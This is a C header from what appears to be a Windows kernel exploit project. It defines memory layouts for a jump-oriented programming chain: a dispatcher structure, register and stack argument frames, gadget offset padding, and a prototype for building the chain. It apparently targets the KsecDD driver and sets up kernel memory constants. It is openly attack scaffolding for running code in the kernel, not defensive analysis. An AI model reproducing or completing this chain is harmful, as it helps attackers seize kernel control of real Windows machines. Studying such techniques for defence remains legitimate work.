#ifndef JOP_JOP_H
#define JOP_JOP_H

#include "jop/gadgets.h"
#include "launcher/kexecdd.h"
#include "offsets.h"
#include "utils/vec.h"
#include <stddef.h>
typedef struct _DispatcherStruct
{
    char _padding[0x70];
    size_t Rcx;
    size_t Rdi;
    char _padding2[0x20];
    size_t Rax;

} DispatcherStruct;

typedef struct {
    size_t _padding1;
    size_t _padding2;
    size_t Rax;
    size_t Rcx;
    size_t Rdx;
    size_t R8;
    size_t R9;
    size_t call_dest;
    size_t padd1;
    size_t padd2;
    size_t padd3;
    size_t arg5;
    size_t arg6;
    size_t arg7;
    size_t arg8;
    size_t arg9;
    size_t new_rdi;
    size_t ret_addr;
    size_t new_rbx;
    size_t new_rsi;
} CallArgs;


typedef struct _StackFirstFourArgs
{
    char _padding[0x10];
    CallArgs args[];
} StackArgs;

typedef struct {
    size_t ret_addr_start;
    StackArgs args;
} StackArgsWithRetAddr ;

typedef struct
{
    size_t jump_address;
} SaveReturnValueStruct;

typedef struct
{
    char padding[POP_RAX_RSI_OFFSET];
    size_t target;
} SavedCallAddress;

bool jop_build_jop_chain(
    Vec *vec_pipes, GadgetsData *gadgets, KsecReturnStruct **return_struct, HANDLE write_pipe
);

#pragma pack(push, 1)
typedef struct
{

    size_t save_and_restore_gadget;
    char padding1[CALL_GADGET_RBP_OFFSET - sizeof(size_t)];
    char pointer_address[POP_RAX_RSI_OFFSET];
    size_t target_function;

} Caller;
#pragma pack(pop)
#define PAGE_SIZE 0x1000
#define IoReadAccess 0
#define IoWriteAccess 1
#define KernelMode 0
#define UserMode 1
#define MmNonCached 0
#define LowPagePriority 0

#endif